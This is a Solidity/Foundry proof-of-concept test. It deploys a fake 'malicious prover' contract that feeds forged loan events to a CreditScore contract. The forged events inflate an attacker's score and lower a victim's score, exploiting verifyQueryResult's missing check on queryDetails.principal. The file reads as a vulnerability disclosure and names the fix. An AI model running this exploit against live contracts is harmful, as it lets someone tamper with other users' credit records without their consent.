// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run with:
//   cd ~/CCNext-smart-contracts
//   forge test --match-test test_creditScoreManipulation -vvvv

import "forge-std/Test.sol";
import {CreditScore} from "../contracts/Loan/CreditScore.sol";
import {ICreditcoinPublicProver, QueryDetails, ResultSegment, QueryState, ChainQuery, LayoutSegment, Balance} from "@gluwa/creditcoin-public-prover/contracts/sol/Prover.sol";

// Malicious prover — returns crafted segments for any CreditScore selector.
contract MaliciousScoreProver {
    bytes32 public immutable selector;
    address public immutable target;

    constructor(bytes32 _selector, address _target) {
        selector = _selector;
        target   = _target;
    }

    function getQueryDetails(bytes32) external view returns (QueryDetails memory qd) {
        ResultSegment[] memory segs = new ResultSegment[](10);
        segs[4].abiBytes = selector;                               // event selector
        segs[6].abiBytes = bytes32(uint256(uint160(target)));      // EXPIRED_LOAN borrower
        segs[8].abiBytes = bytes32(uint256(uint160(target)));      // REPAY/LATE borrower
        segs[9].abiBytes = bytes32(uint256(uint160(target)));      // FUND_LOAN borrower

        LayoutSegment[] memory empty = new LayoutSegment[](0);
        qd.state          = QueryState.ResultAvailable;
        qd.query          = ChainQuery({chainId: 0, height: 0, index: 0, layoutSegments: empty});
        qd.escrowedAmount = Balance.wrap(0);
        qd.principal      = target;   // NOT checked by verifyQueryResult
        qd.estimatedCost  = Balance.wrap(0);
        qd.timestamp      = 0;
        qd.resultSegments = segs;
    }
}

contract CreditScorePoc is Test {
    // Selectors from CreditScore.sol
    bytes32 constant FUND_LOAN_SELECTOR    = 0xa1c86ab2ab7ae6485c68325a433de4a6c7f4bca1f08e39b6f472e966186009a3;
    bytes32 constant REPAY_LOAN_SELECTOR   = 0xa4513463869a9bb2a04ca9d0887721a32388ebe4ade85f8743261b3214b6d65b;
    bytes32 constant EXPIRED_LOAN_SELECTOR = 0xb984513986e8897ae6977834a755925f5f09bed360746d95df469fed6f2f0fa5;

    CreditScore creditScore;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        creditScore = new CreditScore();
    }

    /// @notice Demonstrates attacker inflates own score and tanks victim score
    ///         without any legitimate loan activity.
    function test_creditScoreManipulation() public {
        // ── Pre-state ─────────────────────────────────────────────────────────
        assertEq(creditScore.getCreditScore(attacker), 0, "attacker starts at 0");
        assertEq(creditScore.getCreditScore(victim),   0, "victim starts at 0");

        // ── ATTACK 1: inflate attacker score ─────────────────────────────────

        // Step 1a: init attacker score to 300 via fake LoanFundInitiated event
        MaliciousScoreProver fundProver = new MaliciousScoreProver(FUND_LOAN_SELECTOR, attacker);
        vm.prank(attacker);
        creditScore.verifyQueryResult(address(fundProver), keccak256("fund_attacker"));
        assertEq(creditScore.getCreditScore(attacker), 300, "score initialized to 300");

        // Step 1b: boost score +10 via 10 fake LoanRepaid events
        MaliciousScoreProver repayProver = new MaliciousScoreProver(REPAY_LOAN_SELECTOR, attacker);
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(attacker);
            creditScore.verifyQueryResult(
                address(repayProver),
                keccak256(abi.encodePacked("repay_attacker_", i))
            );
        }
        assertEq(creditScore.getCreditScore(attacker), 310, "attacker score inflated to 310");

        // ── ATTACK 2: tank victim score ───────────────────────────────────────

        // Step 2a: force victim score to 300 via fake LoanFundInitiated
        MaliciousScoreProver fundVictimProver = new MaliciousScoreProver(FUND_LOAN_SELECTOR, victim);
        vm.prank(attacker);
        creditScore.verifyQueryResult(address(fundVictimProver), keccak256("fund_victim"));
        assertEq(creditScore.getCreditScore(victim), 300, "victim score forced to 300");

        // Step 2b: boost victim so -2 deductions are visible
        MaliciousScoreProver repayVictimProver = new MaliciousScoreProver(REPAY_LOAN_SELECTOR, victim);
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(attacker);
            creditScore.verifyQueryResult(
                address(repayVictimProver),
                keccak256(abi.encodePacked("repay_victim_", i))
            );
        }
        assertEq(creditScore.getCreditScore(victim), 310, "victim boosted to 310");

        // Step 2c: tank victim via 5 fake LoanExpired events (-2 each = -10 total)
        MaliciousScoreProver expiredProver = new MaliciousScoreProver(EXPIRED_LOAN_SELECTOR, victim);
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(attacker);
            creditScore.verifyQueryResult(
                address(expiredProver),
                keccak256(abi.encodePacked("expired_victim_", i))
            );
        }
        assertEq(creditScore.getCreditScore(victim), 300, "victim score tanked to 300");

        // ── Final assertions ──────────────────────────────────────────────────
        assertEq(creditScore.getCreditScore(attacker), 310, "attacker score = 310 (no real loans)");
        assertEq(creditScore.getCreditScore(victim),   300, "victim score = 300 (manipulated by attacker)");

        console.log("=== ATTACK SUCCEEDED ===");
        console.log("Attacker score:", creditScore.getCreditScore(attacker), "(was 0, no real loans)");
        console.log("Victim score:  ", creditScore.getCreditScore(victim),   "(tampered without consent)");
        console.log("Root cause: verifyQueryResult accepts any proverContractAddr with no");
        console.log("            check on queryDetails.principal (unlike the secure pattern");
        console.log("            in UniversalBridgeProxy which enforces DEFAULT_ADMIN_ROLE).");
    }

    /// @notice Documents the missing check — the fix that should be present.
    function test_missingPrincipalCheck() public view {
        // The secure sibling (UniversalBridgeProxy) calls:
        //   require(hasRole(DEFAULT_ADMIN_ROLE, queryDetails.principal))
        //
        // CreditScore.verifyQueryResult never reads queryDetails.principal at all.
        // This test documents the gap — the fix is to add the above require().
        console.log("CreditScore.verifyQueryResult does not check queryDetails.principal.");
        console.log("UniversalBridgeProxy.uscBridgeCompleteMint DOES check it.");
        console.log("The code comment in UniversalBridgeProxy even describes this exact attack.");
    }
}
